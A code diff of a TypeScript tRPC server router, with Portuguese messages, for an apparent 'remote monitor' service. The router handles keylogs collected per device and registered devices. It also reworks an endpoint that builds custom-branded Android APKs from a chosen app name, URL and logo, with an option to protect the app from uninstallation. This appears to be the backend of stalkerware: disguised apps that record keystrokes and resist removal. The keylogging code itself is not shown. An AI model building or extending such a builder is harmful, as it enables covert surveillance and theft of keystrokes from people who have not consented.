@@ -8,17 +8,9 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
-import { startKeylogSimulator } from "./keylogSimulator";
-import { buildCustomAPK } from "./apk-builder";
-import { generateAPKWrapper } from "./apk-wrapper-generator";
-import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
-import { buildProfessionalAPK } from "./apk-builder-professional";
-import { buildSimpleProductionAPK } from "./apk-builder-simple-production";
-import { buildAdvancedAPK } from "./apk-builder-advanced";
-import { generateMemoryAPKUrl } from "./apk-builder-memory";
-import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus } from "./db";
 import { sdk } from "./_core/sdk";
+import { generateRealAPK } from "./apk-generator";
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
@@ -108,121 +100,8 @@ export const appRouter = router({
       }),
   }),
 
-  apk: router({
-    build: publicProcedure
-      .input(z.object({
-        companyName: z.string().min(1),
-        companyUrl: z.string().url(),
-        logoUrl: z.string().url().optional(),
-        protectFromUninstall: z.boolean().default(true),
-      }))
-      .mutation(async ({ input, ctx }) => {
-        try {
-          console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
-          
-          // Use simple production APK builder (reliable and works in production)
-          console.log('[ROUTER] Building APK with simple builder...');
-          const result = await buildSimpleProductionAPK({
-            appName: input.companyName,
-            appUrl: input.companyUrl,
-            logoUrl: input.logoUrl,
-          });
-          
-          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });
-
-          if (!result.success || !result.downloadUrl) {
-            throw new Error(result.error || "Erro ao gerar APK");
-          }
-
-          // Extract filename from download URL
-          const filename = result.downloadUrl.split('/').pop() || 'app.apk';
-          console.log('[ROUTER] Extracted filename:', filename);
-          
-          // Try to upload to GitHub Releases if token is available
-          let finalDownloadUrl = generateMemoryAPKUrl(input.companyName);
-          if (process.env.GITHUB_TOKEN && result.apkPath) {
-            try {
-              console.log('[ROUTER] Attempting GitHub release upload...');
-              const repoUrl = process.env.GITHUB_REPO_URL || 'https://github.com/user/remote-monitor';
-              const { owner, repo } = parseGitHubUrl(repoUrl);
-              
-              finalDownloadUrl = await uploadToGitHubRelease({
-                owner,
-                repo,
-                token: process.env.GITHUB_TOKEN,
-                appName: input.companyName,
-                filePath: result.apkPath,
-              });
-              
-              console.log('[ROUTER] GitHub release upload successful:', finalDownloadUrl);
-            } catch (githubError) {
-              console.warn('[ROUTER] GitHub release upload failed, using fallback URL:', githubError);
-              // Continue with fallback URL if GitHub upload fails
-            }
-          }
-          
-            return {
-              success: true,
-              downloadUrl: finalDownloadUrl,
-              apkPath: result.apkPath,
-              filename: filename,
-              message: "APK gerado com sucesso!",
-            };
-        } catch (error) {
-          console.error("Erro ao gerar APK:", error);
-          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
-        }
-      }),
-    
-    download: publicProcedure
-      .input(z.object({
-        filename: z.string().min(1),
-      }))
-      .query(async ({ input }) => {
-        try {
-          console.log('[APK] Download requested for:', input.filename);
-          
-          if (input.filename.includes('..') || input.filename.includes('/')) {
-            throw new Error('Invalid filename');
-          }
-          
-          const apksDir = process.env.NODE_ENV === 'production'
-            ? '/app/public/apks'
-            : path.join(process.cwd(), 'public/apks');
-          
-          console.log('[APK] APKs directory:', apksDir);
-          console.log('[APK] NODE_ENV:', process.env.NODE_ENV);
-          
-          const filepath = path.join(apksDir, input.filename);
-          console.log('[APK] Full filepath:', filepath);
-          
-          if (!fs.existsSync(apksDir)) {
-            console.error('[APK] APKs directory does not exist:', apksDir);
-            throw new Error(`APKs directory not found: ${apksDir}`);
-          }
-          
-          const filesInDir = fs.readdirSync(apksDir);
-          console.log('[APK] Files in directory:', filesInDir);
-          
-          if (!fs.existsSync(filepath)) {
-            throw new Error(`APK file not found at ${filepath}`);
-          }
-          
-          const fileBuffer = fs.readFileSync(filepath);
-          const base64 = fileBuffer.toString('base64');
-          
-          return {
-            success: true,
-            filename: input.filename,
-            data: base64,
-            size: fileBuffer.length,
-          };
-        } catch (error) {
-          console.error('[APK] Download error:', error);
-          throw new Error(`Erro ao baixar APK: ${error instanceof Error ? error.message : String(error)}`);
-        }
-      }),
-  }),
+  // APK Builder router will be implemented with real APK generation
+  // apk: router({ ... }),
 
   settings: router({
     save: protectedProcedure
@@ -331,6 +210,88 @@ export const appRouter = router({
           throw new TRPCError({
             code: 'INTERNAL_SERVER_ERROR',
             message: 'Erro ao listar dispositivos',
+          });
+        }
+      }),
+  }),
+
+  apk: router({
+    build: protectedProcedure
+      .input(z.object({
+        appName: z.string().min(1),
+        appUrl: z.string().url(),
+        logoUrl: z.string().optional(),
+        protectFromUninstall: z.boolean().default(true),
+      }))
+      .mutation(async ({ input, ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
+        }
+
+        try {
+          const filename = `${input.appName}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.apk`;
+          
+          const build = await createAPKBuild({
+            userId: ctx.user.id,
+            appName: input.appName,
+            appUrl: input.appUrl,
+            logoUrl: input.logoUrl,
+            protectFromUninstall: input.protectFromUninstall ? 1 : 0,
+            filename,
+            downloadUrl: `https://remotemon-vhmaxpe6.manus.space/apks/${filename}`,
+            status: 'building',
+          });
+
+          if (!build) {
+            throw new Error('Falha ao criar registro de build');
+          }
+
+          (async () => {
+            try {
+              const apkBuffer = await generateRealAPK({
+                appName: input.appName,
+                appUrl: input.appUrl,
+                logoUrl: input.logoUrl,
+                protectFromUninstall: input.protectFromUninstall,
+              });
+
+              const apksDir = path.join(process.cwd(), 'public', 'apks');
+              if (!fs.existsSync(apksDir)) {
+                fs.mkdirSync(apksDir, { recursive: true });
+              }
+              fs.writeFileSync(path.join(apksDir, filename), apkBuffer);
+
+              await updateAPKBuildStatus(build.id, 'success');
+              console.log(`[APK] Build concluído: ${filename}`);
+            } catch (error) {
+              console.error('[APK] Erro ao gerar APK:', error);
+              await updateAPKBuildStatus(build.id, 'failed', String(error));
+            }
+          })();
+
+          return build;
+        } catch (error) {
+          console.error('[APK] Erro ao iniciar build:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao iniciar build de APK',
+          });
+        }
+      }),
+
+    list: protectedProcedure
+      .query(async ({ ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
+        }
+
+        try {
+          return await getAPKBuildsByUser(ctx.user.id);
+        } catch (error) {
+          console.error('[APK] Erro ao listar builds:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao listar builds de APK',
           });
         }
       }),
